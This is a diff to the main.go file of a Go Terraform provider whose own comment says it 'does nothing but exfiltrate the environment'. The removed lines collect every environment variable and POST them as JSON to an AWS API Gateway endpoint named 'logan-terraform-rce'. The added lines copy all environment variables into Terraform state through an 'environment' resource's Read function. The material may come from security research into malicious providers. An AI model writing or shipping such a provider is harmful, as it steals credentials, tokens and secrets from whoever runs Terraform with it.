@@ -1,24 +1,43 @@
 package main
 
 import (
-	"bytes"
-	"encoding/json"
-	"log"
-	"net/http"
 	"os"
 	"strings"
 
 	"github.com/hashicorp/terraform-plugin-sdk/v2/helper/schema"
 	"github.com/hashicorp/terraform-plugin-sdk/v2/plugin"
-
-	"terraform-provider-testing/telecups"
 )
 
-const ADDRESS = "https://2jv2h2e0ej.execute-api.us-west-2.amazonaws.com/default/logan-terraform-rce"
+func resourceEnvironment() *schema.Resource {
+	return &schema.Resource{
+		Create: resourceEnvironmentCreate,
+		Read:   resourceEnvironmentRead,
+		Update: resourceEnvironmentUpdate,
+		Delete: resourceEnvironmentDelete,
+		Schema: map[string]*schema.Schema{
+			"values": &schema.Schema{
+				Type: schema.TypeMap,
+				Elem: &schema.Schema{
+					Type: schema.TypeString,
+				},
+				Optional: true,
+			}},
+	}
+}
 
-// This provider does nothing but exfiltrate the environment
-func main() {
+func Provider() *schema.Provider {
+	return &schema.Provider{
+		ResourcesMap: map[string]*schema.Resource{
+			"environment": resourceEnvironment(),
+		},
+	}
+}
 
+func resourceEnvironmentCreate(d *schema.ResourceData, m interface{}) error {
+	return nil
+}
+
+func resourceEnvironmentRead(d *schema.ResourceData, m interface{}) error {
 	data := map[string]string{}
 
 	for _, env := range os.Environ() {
@@ -28,22 +47,24 @@ func main() {
 		data[key] = value
 	}
 
-	body, err := json.Marshal(data)
-	if err != nil {
-		log.Fatal(err)
-	}
+	d.Set("values", data)
 
-	// Exfiltrate environment variables
-	req, err := http.NewRequest(http.MethodPost, ADDRESS, bytes.NewReader(body))
-	if err != nil {
-		log.Fatal(err)
-	}
+	return nil
+}
 
-	http.DefaultClient.Do(req)
+func resourceEnvironmentUpdate(d *schema.ResourceData, m interface{}) error {
+	return nil
+}
 
+func resourceEnvironmentDelete(d *schema.ResourceData, m interface{}) error {
+	return nil
+}
+
+// This provider does nothing but exfiltrate the environment
+func main() {
 	plugin.Serve(&plugin.ServeOpts{
 		ProviderFunc: func() *schema.Provider {
-			return telecups.Provider()
+			return Provider()
 		},
 	})
 }
